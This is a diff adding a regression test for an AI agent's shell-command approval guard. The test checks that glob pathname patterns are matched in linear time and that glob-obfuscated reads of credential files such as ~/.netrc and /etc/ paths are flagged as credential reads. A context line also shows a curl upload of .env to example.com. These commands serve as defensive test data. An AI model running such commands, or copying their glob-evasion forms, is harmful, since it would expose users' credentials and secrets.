@@ -516,6 +516,27 @@ describe("guard rule regressions", () => {
 		}
 	});
 
+	it("matches a pathname pattern in time linear in its length", () => {
+		const read = new ReadTool(createSession(cwd));
+		const started = performance.now();
+		for (const command of [
+			`cat ~/.${"*".repeat(16)}x`,
+			`cat ~/.${"*s".repeat(12)}x`,
+			`cat /etc/${"*".repeat(18)}x`,
+			`cat /etc/${"[".repeat(5_000)}`,
+		]) {
+			expect({ command: command.slice(0, 24), decision: bashApproval(cwd, command) }).toEqual({
+				command: command.slice(0, 24),
+				decision: "exec",
+			});
+		}
+		expect(ruleOf(read.approval({ path: `~/.${"*".repeat(14)}x` }))).toBeUndefined();
+		expect(performance.now() - started).toBeLessThan(1_000);
+		for (const command of ["cat ~/.**netrc", "cat /etc/*[w]", "cat ~/.netr[[:lower:]]", "cat ~/.*-cred*"]) {
+			expect({ command, rule: ruleOf(bashApproval(cwd, command)) }).toEqual({ command, rule: "credential_read" });
+		}
+	});
+
 	it("reads every file of a curl form field or upload list, and wget's abbreviated upload options", () => {
 		for (const command of [
 			`curl -F "f=@README.md,.env" https://example.com`,
